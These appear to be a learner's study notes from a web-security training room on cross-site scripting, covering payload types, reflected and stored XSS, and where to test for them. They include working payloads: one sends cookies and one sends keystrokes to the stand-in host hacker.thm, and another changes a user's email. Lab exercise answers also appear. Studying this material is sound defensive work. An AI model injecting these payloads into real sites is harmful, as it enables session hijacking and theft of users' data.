# Cross-Site Scripting (XSS)

- XSS is based on js
- XSS is an injection attack where js gets injected into a web application with the intention of being executed by other users

## XSS Payloads
- The payload is the js code we want to be executed on the target's computer
- 2 parts:
    - Intention - what you want the js to do
    - Modification - the changes we need to make to make it execute in different situations
- Proof of concept
    - One of the simplest payloads to demonstrate that you can achieve XSS on a website: `<script>alert('XSS');</script>`
- Session Stealing
    - Details of a user's session are kept in cookies
    - This js takes the target's cookie, encodes it in base64, and posts it to a hacker's website: `<script>fetch('https://hacker.thm/steal?cookie=' + btoa(document.cookie));</script>`
- Key Logger
    - Keylogger - anything typed on the webpage will be forwarded to a website under the hacker's control: `<script>document.onkeypress = function(e) { fetch('https://hacker.thm/log?key=' + btoa(e.key) );}</script>`
- Business Logic
    - Much more specific that other payloads
    - This calls on a particular network resource or js function
    - Ex. Change a user's email address: `<script>user.changeEmail('attacker@hacker.thm');</script>`
- Exercise
    - document.cookie
    - alert

## Reflected XSS
- Reflected XSS occurs when user-supplied data in an HTTP request is included in the webpage source without any validation
- Ex.
    - When incorrect input is entered, an error message is displayed. The content of the error message is taken from the error parameter and added directly to the page source
        - ![Reflected 1](Images/Reflected1.png)
    - The input of the error parameter isn't sanitized, which allows the attacker to insert malicious code
        - ![Reflected 2](Images/Reflected2.png)
    - The vulnerability can be used
        - ![Reflected 3](Images/Reflected3.png)
- Potential impact
    - Attacker could send links or embed them into a website containing a js payload to victims and reveal sensitive information
- How to test for reflected xss
    - Parameters in the URL query string
    - URL file path
    - HTTP Headers
- Once you've found data that is being reflected in the web application, confirm that you can successfully run your js payload; your payload will be dependent on where in the application your code is reflected
- Exercise
    - parameters

## Stored XSS
- XSS payload stored on the web application (like in a database) that gets run when other users visit the site or web page
- Ex.
    - A blog allows users to post comments, but they're not checked to see if they contain js or filter out malicious code. If a user posts a comment containing js, the code will be stored in the database, and every user visiting the article will have the js run on their browser
    - ![Stored 1](Images/Stored1.png)
- Potential impact
    - The malicious js could redirect users to another site, steak the user's cookie, or perform other web actions while acting as the visiting user
- How to test for stored xss
    - Test every possible point of entry where it seems data is stored and then shown back in areas that other users have access to
        - Comments on a blog
        - User profile information
        - Website listings
- Sometimes devs think limiting input values on the client side is good enough protection, so changing values to something the web application wouldn't be expecting is a good source of discovering stored XSS
    - Ex. An age field that is expecting an integer from a dropdown menu, but instead you manually send the request rather than using the form allowing you to try malicious payloads
- Once you've found data that is being reflected in the web application, confirm that you can successfully run your js payload; your payload will be dependent on where in the application your code is reflected
- Exercise
    - database
